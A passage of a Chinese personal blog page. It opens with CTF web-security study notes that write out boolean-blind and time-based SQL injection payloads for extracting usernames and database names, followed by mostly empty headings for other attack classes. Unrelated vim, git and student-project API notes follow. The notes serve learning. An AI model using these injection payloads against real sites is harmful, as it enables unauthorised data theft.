<p><strong>⑥ 获取字段值</strong><br><strong>?id&#x3D;1’ and ascii(substr((select username from users limit 0, 1), 1, 1)) &#x3D; 97 – a</strong><br><strong>?id&#x3D;1’ and ascii(substr((select group_concat(username) from users), 1, 1)) &#x3D; 97 – a</strong></p>
<h4 id="4-宽字节（时间）注入"><a href="#4-宽字节（时间）注入" class="headerlink" title="4.宽字节（时间）注入"></a>4.宽字节（时间）注入</h4><p><strong>?id&#x3D;1’ and if(length(database()) &#x3D; 8, sleep(5), 1) – a</strong> 睡了5秒<br>因为没有回显，可在布尔盲注上加上if(布尔盲注语句,sleep(5),1)，通过时间判断对错</p>
<p>主要通过if() 和substr() 和sleep()</p>
<h4 id="5-二次注入"><a href="#5-二次注入" class="headerlink" title="5.二次注入"></a>5.二次注入</h4><p>第一次过滤了’等特殊字符  但后面更新是没有过滤’等特殊字符 导致更新是二次注入</p>
<h3 id="二、xss（跨站脚本攻击）"><a href="#二、xss（跨站脚本攻击）" class="headerlink" title="二、xss（跨站脚本攻击）"></a>二、xss（跨站脚本攻击）</h3><p>\<a target="_blank" rel="noopener" href="https://www.cnblogs.com/snad/p/17247840.html">https://www.cnblogs.com/snad/p/17247840.html</a></p>
<h4 id="1-XSS漏洞类型和利用方法"><a href="#1-XSS漏洞类型和利用方法" class="headerlink" title="1.XSS漏洞类型和利用方法"></a>1.XSS漏洞类型和利用方法</h4><h4 id="2-绕过“内容安全策略”"><a href="#2-绕过“内容安全策略”" class="headerlink" title="2.绕过“内容安全策略”"></a>2.绕过“内容安全策略”</h4><h3 id="三、PHP特性攻击"><a href="#三、PHP特性攻击" class="headerlink" title="三、PHP特性攻击"></a>三、PHP特性攻击</h3><h4 id="1-x3D-与-x3D-区别"><a href="#1-x3D-与-x3D-区别" class="headerlink" title="1.=&#x3D;与==&#x3D;区别"></a>1.=&#x3D;与==&#x3D;区别</h4><p>==&#x3D;在进行比较的时候，会先判断两种字符串的类型是否相等，再比较<br>=&#x3D;在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
<p>1=&#x3D;=true:false<br>1=&#x3D;ture:true</p>
<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行<br><strong>字符串与数字转换规则</strong>：<br>从遇见的第一位不是数字开始丢弃<br>123admin-&gt;123<br>123a12321-&gt;123</p>
<h4 id="2-MD5验证绕过方法"><a href="#2-MD5验证绕过方法" class="headerlink" title="2.MD5验证绕过方法"></a>2.MD5验证绕过方法</h4><p>\<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64815693/article/details/126834664">https://blog.csdn.net/m0_64815693/article/details/126834664</a></p>
<h3 id="四、文件上传"><a href="#四、文件上传" class="headerlink" title="四、文件上传"></a>四、文件上传</h3><h4 id="1-客户端检测绕过方式"><a href="#1-客户端检测绕过方式" class="headerlink" title="1.客户端检测绕过方式"></a>1.客户端检测绕过方式</h4><h4 id="2-MIME类型检测绕过方式"><a href="#2-MIME类型检测绕过方式" class="headerlink" title="2.MIME类型检测绕过方式"></a>2.MIME类型检测绕过方式</h4><h4 id="3-文件后缀检测绕过方式"><a href="#3-文件后缀检测绕过方式" class="headerlink" title="3.文件后缀检测绕过方式"></a>3.文件后缀检测绕过方式</h4><h4 id="4-文件内容检测绕过方式"><a href="#4-文件内容检测绕过方式" class="headerlink" title="4.文件内容检测绕过方式"></a>4.文件内容检测绕过方式</h4><h3 id="五、文件包含"><a href="#五、文件包含" class="headerlink" title="五、文件包含"></a>五、文件包含</h3><h4 id="1-文件包含的函数"><a href="#1-文件包含的函数" class="headerlink" title="1.文件包含的函数"></a>1.文件包含的函数</h4><h4 id="2-读取敏感文件6547"><a href="#2-读取敏感文件6547" class="headerlink" title="2.读取敏感文件6547"></a>2.读取敏感文件6547</h4><h4 id="3-获取服务器权限"><a href="#3-获取服务器权限" class="headerlink" title="3.获取服务器权限"></a>3.获取服务器权限</h4><h3 id="六、远程命令执行"><a href="#六、远程命令执行" class="headerlink" title="六、远程命令执行"></a>六、远程命令执行</h3><h4 id="1-PHP等语言常见的系统命令执行函数"><a href="#1-PHP等语言常见的系统命令执行函数" class="headerlink" title="1.PHP等语言常见的系统命令执行函数"></a>1.PHP等语言常见的系统命令执行函数</h4><p>利用了执行命令函数的参数漏洞<br>mkdir </p>
<h4 id="2-命令拼接方法"><a href="#2-命令拼接方法" class="headerlink" title="2.命令拼接方法"></a>2.命令拼接方法</h4><h4 id="3-绕过过滤机制"><a href="#3-绕过过滤机制" class="headerlink" title="3.绕过过滤机制"></a>3.绕过过滤机制</h4><h3 id="七、服务端请求伪造"><a href="#七、服务端请求伪造" class="headerlink" title="七、服务端请求伪造"></a>七、服务端请求伪造</h3><h4 id="1-SSRF的利用技巧"><a href="#1-SSRF的利用技巧" class="headerlink" title="1.SSRF的利用技巧"></a>1.SSRF的利用技巧</h4><h4 id="2-SSRF攻击mysql"><a href="#2-SSRF攻击mysql" class="headerlink" title="2.SSRF攻击mysql"></a>2.SSRF攻击mysql</h4><h4 id="3-SSRF攻击redis"><a href="#3-SSRF攻击redis" class="headerlink" title="3.SSRF攻击redis"></a>3.SSRF攻击redis</h4><h3 id="八、XML外部实体注入"><a href="#八、XML外部实体注入" class="headerlink" title="八、XML外部实体注入"></a>八、XML外部实体注入</h3><p>\<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wwcdg/p/15913894.html">https://www.cnblogs.com/wwcdg/p/15913894.html</a></p>
<h4 id="1-XML基础知识"><a href="#1-XML基础知识" class="headerlink" title="1.XML基础知识"></a>1.XML基础知识</h4><h4 id="2-绕过过滤机制，实现漏洞利用"><a href="#2-绕过过滤机制，实现漏洞利用" class="headerlink" title="2.绕过过滤机制，实现漏洞利用"></a>2.绕过过滤机制，实现漏洞利用</h4><h3 id="九、NodeJS"><a href="#九、NodeJS" class="headerlink" title="九、NodeJS"></a>九、NodeJS</h3><h4 id="1-javaScrip基本语法"><a href="#1-javaScrip基本语法" class="headerlink" title="1.javaScrip基本语法"></a>1.javaScrip基本语法</h4><h4 id="2-类型污染"><a href="#2-类型污染" class="headerlink" title="2.类型污染"></a>2.类型污染</h4><h4 id="3-原型链污染"><a href="#3-原型链污染" class="headerlink" title="3.原型链污染"></a>3.原型链污染</h4><h3 id="十、反序列化"><a href="#十、反序列化" class="headerlink" title="十、反序列化"></a>十、反序列化</h3><h4 id="1-PHP反序列化漏洞原理"><a href="#1-PHP反序列化漏洞原理" class="headerlink" title="1.PHP反序列化漏洞原理"></a>1.PHP反序列化漏洞原理</h4><h4 id="2-构造POP链"><a href="#2-构造POP链" class="headerlink" title="2.构造POP链"></a>2.构造POP链</h4><h2 id="Reverse（逆向工程）"><a href="#Reverse（逆向工程）" class="headerlink" title="Reverse（逆向工程）"></a>Reverse（逆向工程）</h2><h2 id="PNW（漏洞挖掘与漏洞利用）二进制难"><a href="#PNW（漏洞挖掘与漏洞利用）二进制难" class="headerlink" title="PNW（漏洞挖掘与漏洞利用）二进制难"></a>PNW（漏洞挖掘与漏洞利用）二进制难</h2></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/1a64d2540900.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-15</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95/">工具记录</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E5%B7%A5%E5%85%B7%E8%AE%B0%E5%BD%95/vim/">vim</a></span><div class="content"><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/126560108">(96条消息) vim使用教程图文教程（零基础超详细）_士别三日wyx的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/blood_Z/article/details/125064927">(106条消息) vim命令大全_万山寒的博客-CSDN博客</a></p>
<p>vim命令大全<br>1.vim介绍<br>vim编辑器有三种模式：<br>命令模式、编辑模式、末行模式</p>
<p>模式间切换方法：<br>（1）命令模式下，输入:后，进入末行模式<br>（2）末行模式下，按esc慢退、按两次esc快退、或者删除所有命令，可以回到命令模式<br>（3）命令模式下，按下i、a等键，可以计入编辑模式<br>（4）编辑模式下，按下esc，可以回到命令模式</p>
<p>vim打开文件：<br>Vi 使用的选项	说 明<br>vim filename	打开或新建一个文件，并将光标置于第一行的首部<br>vim -r filename	恢复上次 vim 打开时崩溃的文件<br>vim -R filename	把指定的文件以只读方式放入 Vim 编辑器中<br>vim + filename	打开文件，并将光标置于最后一行的首部<br>vi +n filename	打开文件，并将光标置于第 n 行的首部<br>vi +&#x2F;pattern filename	打幵文件，并将光标置于第一个与 pattern 匹配的位置<br>vi -c command filename	在对文件进行编辑前，先执行指定的命令<br>2.命令模式<br>1.光标移动<br>快捷键	功能描述<br>jkhl	基本上下左右<br>gg	光标移动到文档首行<br>G	光标移动到文档尾行<br>^或_	光标移动到行首第一个非空字符<br>home键或0或者g0	光标移动到行首第一个字符<br>g_	光标移动到行尾最后一个非空字符<br>end或或者 g 或者g或者g	光标移动到行尾最后一个字符<br>gm	光标移动到当前行中间处<br>b&#x2F;B	光标向前移动一个单词（大写忽略&#x2F;-等等特殊字符）<br>w&#x2F;W	光标向后移动一个单词（大写忽略&#x2F;-等等特殊字符）<br>e&#x2F;E	移到单词结尾（大写忽略&#x2F;-等等特殊字符）<br>ctrl+b或pageUp键	翻屏操作，向上翻<br>ctrl+f或pageDn键	翻屏操作，向下翻<br>数字+G	快速将光标移动到指定行<br>&#96;.	移动到上次编辑处<br>数字+上下方向键	以当前光标为准，向上&#x2F;下移动n行<br>数字+左右方向键	以当前光标为准，向左&#x2F;右移动n个字符<br>H	移动到屏幕顶部<br>M	移动到屏幕中间<br>L	移动到屏幕尾部<br>z+Enter键	当前行在屏幕顶部<br>z+ .	当前行在屏幕中间<br>z+ -	当前行在屏幕底部<br>shift+6	光标移动到行首<br>shift+4	光标移动到行尾<br>-	移动到上一行第一个非空字符<br>+	移动到下一行第一个非空字符<br>)	向前移动一个句子<br>(	向后移动一个句子<br>}	向前移动一个段落<br>{	向前移动一个段落<br>count l	移动到count 列<br>counth	向左移动count 字符<br>countl	向右移动count字符<br>countgo	移动到count字符<br>2.选中内容<br>快捷键	功能描述<br>v	进行字符选中<br>V 或shift+v	进行行选中<br>gv	选中上一次选择的内容<br>o	光标移动到选中内容另一处结尾<br>O	光标移动到选中内容另一处角落<br>ctr + V	进行块选中<br>3.复制（配合粘贴命令p使用）<br>快捷键	功能描述<br>y	复制已选中的文本到剪贴板<br>n+yy	复制光标所在行，此命令前可以加数字 n，可复制多行<br>yw	复制光标位置的单词<br>ctrl+v + 方向键+yy	ctrl+v，并按方向键选中区块，按下yy复制<br>4.剪切<br>快捷键	功能描述<br>dd	剪切光标所在行<br>数字+dd	以光标所在行为准（包含当前行），向下剪切指定行数<br>D	剪切光标所在行<br>5.粘贴<br>快捷键	功能描述<br>p	将剪贴板中的内容粘贴到光标后<br>P（大写）	将剪贴板中的内容粘贴到光标前<br>6.删除<br>快捷键	功能描述<br>x	删除光标所在位置的字符<br>X(大写)	删除光标前一个字符<br>dd	删除光标所在行，删除之后，下一行上移<br>D	删除光标位置到行尾的内容，删除之后，下一行不上移<br>ndd	删除当前行（包括此行）后 n 行文本<br>dw	移动光标到单词的开头以删除该单词<br>dG	删除光标所在行一直到文件末尾的所有内容<br>:a1,a2d	删除从 a1 行到 a2 行的文本内容<br>7.撤销&#x2F;恢复<br>快捷键	功能描述<br>u	撤销<br>ctrl+r	恢复<br>U(大写)	撤销所有编辑<br>8.字符转换<br>快捷键	功能描述<br>~	转换大小写<br>u	变成小写<br>U	变成大写<br>9.编辑命令的快捷键<br>快捷键	功能描述<br>↑或ctr + p	上一条命令<br>↓或ctr + n	下一条命令<br>ctr + b	移动到命令行开头<br>ctr + e	移动到命令行结尾<br>ctr + ←	向左一个单词<br>ctr + →	向右一个单词<br>3.末行模式(: xxx命令)<br>1.保存&#x2F;退出文件操作<br>命令	功能描述<br>:wq	保存并退出 Vim 编辑器<br>:wq!	保存并强制退出 Vim 编辑器<br>:q	不保存就退出 Vim 编辑器<br>:q!	不保存，且强制退出 Vim 编辑器<br>:w	保存但是不退出 Vim 编辑器<br>:w!	强制保存文本<br>:w filename	另存到 filename 文件<br>x！	保存文本，并退出 Vim 编辑器<br>ZZ	直接退出 Vim 编辑器<br>2.查找：“&#x2F;关键词”<br>在查找结果中，用N、n可以切换上下结果；输入nohl，可以取消高亮</p>
<p>快捷键	功能描述<br>&#x2F;abc	从光标所在位置向前查找字符串 abc<br>&#x2F;^abc	查找以 abc 为行首的行<br>&#x2F;abc$	查找以 abc 为行尾的行<br>?abc	从光标所在位置向后查找字符串 abc<br>n或；	向同一方向重复上次的查找指令<br>N或,	向相反方向重复上次的查找指定<br>3.替换<br>快捷键	功能描述<br>r	替换光标所在位置的字符<br>R	从光标所在位置开始替换字符，其输入内容会覆盖掉后面等长的文本内容，按“Esc”可以结束<br>:s&#x2F;a1&#x2F;a2	替换当前光标所在行第一处符合条件的内容<br>:s&#x2F;a1&#x2F;a2&#x2F;g	替换当前光标所在行所有的 a1 都用 a2 替换<br>:%s&#x2F;a1&#x2F;a2	替换所有行中，第一处符合条件的内容<br>:%s&#x2F;a1&#x2F;a2&#x2F;g	替换所有行中，所有符合条件的内容<br>:n1,n2 s&#x2F;a1&#x2F;a2	将文件中 n1 到 n2 行中第一处 a1 都用 a2 替换<br>:n1,n2 s&#x2F;a1&#x2F;a2&#x2F;g	将文件中 n1 到 n2 行中所有 a1 都用 a2 替换<br>4.行号显示：“: set nu”;<br>行号显示:set nu<br>取消行号显示：:set nonu<br>5.文件切换<br>使用vim打开多个文件后，在末行模式下可以进行切换。</p>
<p>查看当前已经打开的所有文件：:files(%a表示激活状态，#表示上一个打开的文件)<br>切换到指定文件：:open 文件名<br>切换到上一个文(back previous)：:bp<br>切换到下一个文件(back next)：:bn<br>4.编辑模式<br>快捷键	功能描述<br>i	在当前光标所在位置插入，光标后的文本相应向右移动<br>I	在光标所在行的行首插入，行首是该行的第一个非空白字符，相当于光标移动到行首执行 i 命令<br>o	在光标所在行的下插入新的一行。光标停在空行首，等待输入文本<br>O（大写）	在光标所在行的上插入新的一行。光标停在空行的行首，等待输入文本<br>a	在当前光标所在位置之后插入<br>A	在光标所在行的行尾插入，相当于光标移动到行尾再执行 a 命令<br>esc键	退出编辑模式<br>5.扩展<br>1.代码颜色显示：“：syntax on&#x2F;off”</p>
<p>2.vim内置计算器：<br>a.进入编辑模式<br>b.按“ctrl+r，光标变成引号，，输入&#x3D;，光标转到最后一行<br>c.输入需要计算的内容，按下enter后，计算结果回替代上一步中的引号，光标恢复</p>
<p>3.vim的配置<br>a.文件打开时，末行模式下输入的配置为临时配置，关闭文件后配置无效<br>b.修改个人配置文件，可以永久保存个人配置（~&#x2F;.vimrc，如果没有可以自行创建）<br>c.修改全局配置文件，对每个用户生效（vim自带，&#x2F;etc&#x2F;vimrc）</p>
<p>注：个人配置文件优先级更高，当个人配置和全局配置发生冲突时，系统以当前用户的个人配置文件为准</p>
<p>4.异常退出<br>在编辑文件后，未正常保存退出时，会产生异常退出交换文件（.原文件名.swp）<br>将交换文件删除后，再次打开文件时，无提示：“#rm -f .原文件名.swp”</p>
<p>5.别名机制：自定义指令<br>Linux中，存在一个别名映射文件： ~&#x2F;.bashrc<br>修改文件内容，可以自定义指令，重新登录账号后生效</p>
<p>6.文件快捷方式<br>对于深层文件，可以创建文件快捷方式，便于后续操作：#ln -s 源路径 新路径<br>7. 退出方式<br>（1）在vim中退出文件编辑模式，可以使用:q或者:wq<br>（2）建议使用:x：使用效果等同于wq，如果文件有改动则先保存后退出；但是如果文件没有做修改，会直接退出，不会修改文件更新时间，避免用户混淆文件的修改时间<br>————————————————<br>版权声明：本文为CSDN博主「万山寒」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/blood_Z/article/details/125064927">https://blog.csdn.net/blood_Z/article/details/125064927</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/79a5e1d4887a.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-15</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/">culitivate</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/java%E6%8A%80%E6%9C%AF%E6%A0%88/">java技术栈</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/culitivate/java%E6%8A%80%E6%9C%AF%E6%A0%88/git/">git</a></span><div class="content"><h2 id="克隆项目"><a href="#克隆项目" class="headerlink" title="克隆项目"></a>克隆项目</h2><p>git clone -b branch http….</p>
<h2 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h2><p>与本地分支同名并且合并<br>git push</p>
<h2 id="拉取"><a href="#拉取" class="headerlink" title="拉取"></a>拉取</h2><p>与本地分支同名并且合并<br>git pull</p>
<p>解决冲突<br><a target="_blank" rel="noopener" href="https://www.pianshen.com/article/3721732292/">git如何处理别人的pull request及解决冲突 - 程序员大本营 (pianshen.com)</a></p>
<h1 id="教程链接"><a href="#教程链接" class="headerlink" title="教程链接"></a>教程链接</h1><p><a target="_blank" rel="noopener" href="https://m.php.cn/tool/git/542146.html">git安装后如何拉取gitee代码-git-PHP中文网</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64284147/article/details/121440606">(96条消息) 使用git把项目提交到gitee（命令篇）_如何使用git推送到gitee_Ken_1115的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="http://www.bilibili.com/">www.bilibili.com</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/07/46d1691adbad.html">No title</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-07-11</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/project/">project</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/project/2023%E6%9A%91%E6%9C%9F%E9%A1%B9%E7%9B%AEhealth/">2023暑期项目health</a></span><div class="content"><h1 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h1><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>表名：session<br>用途：存储用户的openid，以及sessionid</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>数据类型</th>
<th>约束</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INT</td>
<td>PRIMARY KEY</td>
<td>id标识</td>
</tr>
<tr>
<td>openid</td>
<td>VARCHAR(50)</td>
<td>NOT NULL</td>
<td>保存用户的唯一openid</td>
</tr>
<tr>
<td>sessionid</td>
<td>VARCHAR(50)</td>
<td>NOT NULL</td>
<td>userid</td>
</tr>
</tbody></table>
<h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p>表名：user<br>用途：存储用户基本公共信息</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>数据类型</th>
<th>约束</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INT</td>
<td>PRIMARY KEY</td>
<td>id标识</td>
</tr>
<tr>
<td>userid</td>
<td>VARCHAR(50)</td>
<td>PRIMARY KEY</td>
<td>用于唯一标识每个用户的ID号，确保每个用户都有一个唯一的标识符</td>
</tr>
<tr>
<td>username</td>
<td>VARCHAR(50)</td>
<td>NOT NULL</td>
<td>用于存储用户的名字或昵称</td>
</tr>
<tr>
<td>useravatar</td>
<td>VARCHAR(50)</td>
<td>DEFAULT</td>
<td>储存用户头像路径（先存在腾讯存储桶中后存储路径）</td>
</tr>
<tr>
<td>userbirth</td>
<td>INT</td>
<td>DEFAULT 0</td>
<td>用于记录用户出生年月日</td>
</tr>
<tr>
<td>usercountry</td>
<td>VARCHAR(50)</td>
<td>DEFAULT 北京</td>
<td>用于记录用户所在地区</td>
</tr>
<tr>
<td>treecount</td>
<td>INT</td>
<td>DEFAULT 0</td>
<td>用于记录用户所拥有的树木数量</td>
</tr>
<tr>
<td>energycount</td>
<td>INT</td>
<td>DEFAULT 0</td>
<td>用于记录用户所拥有的能量值，每天更新</td>
</tr>
</tbody></table>
<h2 id="trends"><a href="#trends" class="headerlink" title="trends"></a>trends</h2><table>
<thead>
<tr>
<th>字段</th>
<th>数据类型</th>
<th>约束</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INT</td>
<td>PRIMARY KEY</td>
<td>id标识</td>
</tr>
<tr>
<td>userid</td>
<td>VARCHAR(50)</td>
<td>DEFAULT</td>
<td>用户唯一标识</td>
</tr>
<tr>
<td>words</td>
<td>VARCHAR(50)</td>
<td>DEFAULT 0</td>
<td>动态文本</td>
</tr>
<tr>
<td>pictures</td>
<td>VARCHAR(50)</td>
<td>DEFAULT 0</td>
<td>动态图片</td>
</tr>
<tr>
<td>lasttime</td>
<td>VARCHAR(50)</td>
<td>DEFAULT 0</td>
<td>上传时间</td>
</tr>
</tbody></table>
<p>表名：tantrends<br>用途：存储用户的碳排放打卡动态</p>
<p>表名：foodtrends<br>用途：存储用户的光盘打卡动态</p>
<p>表名：rubbishtrends<br>用途：存储用户的垃圾分类打卡动态</p>
<h2 id="food"><a href="#food" class="headerlink" title="food"></a>food</h2><p>表名：food<br>用途：存储食谱</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>数据类型</th>
<th>约束</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>foodname</td>
<td>VARCHAR(50)</td>
<td>PRIMARY KEY</td>
<td>食物名称</td>
</tr>
<tr>
<td>foodpicture</td>
<td>VARCHAR(50)</td>
<td>DEFAULT</td>
<td>食物图片</td>
</tr>
<tr>
<td>foodcalorie</td>
<td>INT</td>
<td>DEFAULT 0</td>
<td>食物卡路里</td>
</tr>
</tbody></table>
<h2 id="task"><a href="#task" class="headerlink" title="task"></a>task</h2><p>表名：task<br>用途：记录每日打卡任务</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>数据类型</th>
<th>约束</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INT</td>
<td>PRIMARY KEY</td>
<td>id标识</td>
</tr>
<tr>
<td>energy</td>
<td>INT</td>
<td>DEFAULT</td>
<td>任务能量值</td>
</tr>
<tr>
<td>words</td>
<td>VARCHAR(50)</td>
<td>DEFAULT</td>
<td>任务描述</td>
</tr>
<tr>
<td>answer</td>
<td>VARCHAR(50)</td>
<td>DEFAULT 0</td>
<td>任务答案:[a,b,c]</td>
</tr>
<tr>
<td>任务类型：</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>问答型</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>题目+答案</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>前端请求task表，获取每日打卡任务</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>用户作答打卡后，记录下用户作答情况:如一共五题，打卡了前三题，则向后端传[1,1,1,0,0]，以及增加的能量值（每打卡一题传一次）</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="usertask"><a href="#usertask" class="headerlink" title="usertask"></a>usertask</h2><p>表名：usertask<br>用途：记录用户每日打卡任务情况</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>数据类型</th>
<th>约束</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>INT</td>
<td>PRIMARY KEY</td>
<td>id标识</td>
</tr>
<tr>
<td>userid</td>
<td>VARCHAR(50)</td>
<td>DEFAULT</td>
<td>用户唯一标识</td>
</tr>
<tr>
<td>situation</td>
<td>VARCHAR(50)</td>
<td>DEFAULT 0</td>
<td>打卡情况，每日更新为null,[1,0,1]</td>
</tr>
</tbody></table>
<h1 id="后端接口列表"><a href="#后端接口列表" class="headerlink" title="后端接口列表"></a>后端接口列表</h1><h2 id="登录接口"><a href="#登录接口" class="headerlink" title="登录接口"></a>登录接口</h2><p><strong>post方法</strong>*<br><strong>地址</strong><br><a target="_blank" rel="noopener" href="http://47.120.14.52:8081/login">http://47.120.14.52:8081/login</a><br><strong>参数：</strong><br>code<br><strong>返回值</strong><br>返回user信息以及sessionid<br>sessionid用于校验用户身份</p>
<h2 id="更新用户信息接口"><a href="#更新用户信息接口" class="headerlink" title="更新用户信息接口"></a>更新用户信息接口</h2><p><strong>post方法</strong><br><strong>地址：</strong><br><a target="_blank" rel="noopener" href="http://47.120.14.52:8081/updatauser">http://47.120.14.52:8081/updatauser</a><br><strong>参数</strong><br>必须参数：sessionid<br>可选参数：username、userarea、useravatar、userdate（日期字符串格式1991-01-01）<br><strong>返回值：</strong><br>更新后的user信息</p>
<h2 id="动态接口"><a href="#动态接口" class="headerlink" title="动态接口"></a>动态接口</h2><h2 id="上传动态"><a href="#上传动态" class="headerlink" title="上传动态"></a>上传动态</h2><p>地址：\<a target="_blank" rel="noopener" href="http://47.120.14.52:8081/trends/up">http://47.120.14.52:8081/trends/up</a><br>header:{“sessionid”,”trendtype”:{“tan”&#x2F;“food”&#x2F;“rubbish”}}<br>raw:{</p>
<p>   “username”:”最新name”,</p>
<p>   “useravatar”:”bb”,</p>
<p>   “words”:”bc”,</p>
<p>   “pictures”:[“bd”,”wed”,”wedw”],</p>
<p>   “lasttime”:”1039-02-02 14:34:54”</p>
<p>}</p>
<h2 id="获取动态"><a href="#获取动态" class="headerlink" title="获取动态"></a>获取动态</h2><h3 id="大厅展示"><a href="#大厅展示" class="headerlink" title="大厅展示"></a>大厅展示</h3><p>地址:\<a target="_blank" rel="noopener" href="http://47.120.14.52:8081/trends/findbypage">http://47.120.14.52:8081/trends/findbypage</a><br>header:{“sessionid”,”trendtype”:{“tan”&#x2F;“food”&#x2F;“rubbish”}}<br>raw:{</p>
<p>    “page”:1,</p>
<p>    “size”:2</p>
<p>}</p>
<h3 id="个人仓库动态展示"><a href="#个人仓库动态展示" class="headerlink" title="个人仓库动态展示"></a>个人仓库动态展示</h3><p>设计思路：<br>在大厅的方法中加入sessionid查询<br>地址:\<a target="_blank" rel="noopener" href="http://47.120.14.52:8081/trends/findselfbypage">http://47.120.14.52:8081/trends/findselfbypage</a><br>header:{“sessionid”,”trendtype”:{“tan”&#x2F;“food”&#x2F;“rubbish”}}<br>raw:{</p>
<p>    “page”:1,</p>
<p>    “size”:2</p>
<p>}</p>
<h2 id="删除动态"><a href="#删除动态" class="headerlink" title="删除动态"></a>删除动态</h2><p>设计思路：<br>只有用户自己可以删除自己的动态<br>先进行用户检查，确保在数据库中<br>将用户sessionid与删除动态的userid对应<br>若一致则删除<br>若不一致，显示无权限删除</p>
<p>地址:\<a target="_blank" rel="noopener" href="http://47.120.14.52:8081/trends/rmv">http://47.120.14.52:8081/trends/rmv</a><br>header:{“sessionid”,”trendid”,”trendtype”:{“tan”&#x2F;“food”&#x2F;“rubbish”}}</p>
<h2 id="每日打卡"><a href="#每日打卡" class="headerlink" title="每日打卡"></a>每日打卡</h2><h1 id="项目提升"><a href="#项目提升" class="headerlink" title="项目提升"></a>项目提升</h1><h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><p>前端传code+appid+appsecret</p>
<p>后端</p>
<ol>
<li>接收code+appid+appsecret</li>
<li>在接受方法内调用登录凭证校验接口获取appid</li>
<li>新建一张用户表存放appid+sessionid，appid对应userid</li>
</ol>
<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p>使用Spring Security 做权限控制，替代拦截器的拦截控制，并使用自己的认证方案替代Security认证流程,使<br>权限认证和控制更加方便灵活。<br>使用Redis的set实现点赞, zset 实现关注，并使用Redis存储登录ticket和验证码，解决分布式session问<br>题。<br>使佣Redis高级数据类型HyperLogLog统计UV(Unique Visitor),使用Bitmap统计DAU (Daily Active User)。<br>使用Kafka处理发送评论、点赞和关注等系统通知，并使用事件进行封装，构建了强大的异步消息系统。<br>使用Elasticsearch做全局搜索，并通过事件封装，增加关键词高亮显示等功能。<br>对热帖排行模块，使用分布式缓存Redis和本地缓存Caffeine作为多级缓存,避免了缓存雪崩，将QPS提升了<br>20倍(10-200)，大大提升了网站访问速度。并使用Quartz定时更新热帖排行。</p>
<p>使用 Kafka 处理发送评论、点赞和关注等系统通知，并使用事件进行封装，构建了强大的异步消息系统。</p>
